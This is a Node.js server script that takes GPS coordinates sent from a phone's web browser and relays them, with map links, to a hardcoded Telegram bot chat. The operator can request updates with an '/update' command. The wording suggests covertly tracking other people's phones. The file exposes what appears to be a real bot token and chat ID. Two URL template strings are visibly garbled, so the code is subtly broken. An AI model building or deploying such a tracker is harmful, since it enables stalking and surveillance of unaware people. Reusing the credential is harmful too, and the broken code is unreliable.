const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "8800421642:AAFaQPILSBVnrlPOy_rmoSwAmYl5FRC9s_8";
const TELEGRAM_CHAT_ID = "8714686528"; 

// --- TRACKING LOGIC FLAGS ---
let singleUpdateRequested = false;
let knownDevices = {};

// Helper Function: Transmit Messages out to Telegram Chat
function sendTelegramMessage(text) {
    const data = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: "Markdown"
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, () => {});
    req.on('error', (err) => console.error("Telegram Outbound Error:", err));
    req.write(data);
    req.end();
}

// Long Polling System: Listens for your "/update" text message command 
let lastUpdateId = 0;
function pollTelegramUpdates() {
    https.get(`https://telegram.org{TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`, (res) => {
        let data = '';
        res.on('data', (chunk) => data += chunk);
        res.on('end', () => {
            try {
                const response = JSON.parse(data);
                if (response.ok && response.result.length > 0) {
                    for (let update of response.result) {
                        lastUpdateId = update.update_id;
                        if (update.message && String(update.message.chat.id) === TELEGRAM_CHAT_ID) {
                            const text = update.message.text ? update.message.text.trim() : "";
                            if (text === "/update") {
                                singleUpdateRequested = true;
                                sendTelegramMessage("🔄 *Request acknowledged.* Waiting for the next live phone transmission update...");
                            }
                        }
                    }
                }
            } catch (e) {}
            pollTelegramUpdates();
        });
    }).on('error', (err) => {
        setTimeout(pollTelegramUpdates, 5000);
    });
}

// Create Cloud Server Interface
const server = http.createServer((req, res) => {
    if (req.method === 'GET') {
        // Serve the index.html file to the phone web browser
        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(content);
        });
    } else if (req.method === 'POST' && req.url === '/update') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            const coords = JSON.parse(body);
            const time = new Date().toLocaleTimeString();
            const mapsLink = `https://google.com{coords.lat},${coords.lon}`;
            
            let shouldSendAlert = false;

            if (!knownDevices[coords.name]) {
                knownDevices[coords.name] = true;
                shouldSendAlert = true;
            } else if (singleUpdateRequested) {
                singleUpdateRequested = false; 
                shouldSendAlert = true;
            }

            if (shouldSendAlert) {
                const msg = `🚨 *Location Update Alert!*\n👤 *Device:* ${coords.name}\n⏰ *Time:* ${time}\n📍 *Coords:* ${coords.lat}, ${coords.lon}\n\n🗺️ [View on Google Maps](${mapsLink})`;
                sendTelegramMessage(msg);
            }

            res.writeHead(200);
            res.end();
        });
    }
});

// Render cloud hosting platform tells the server what network port to use dynamically
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Cloud Server active on port ${PORT}`);
    pollTelegramUpdates();
});
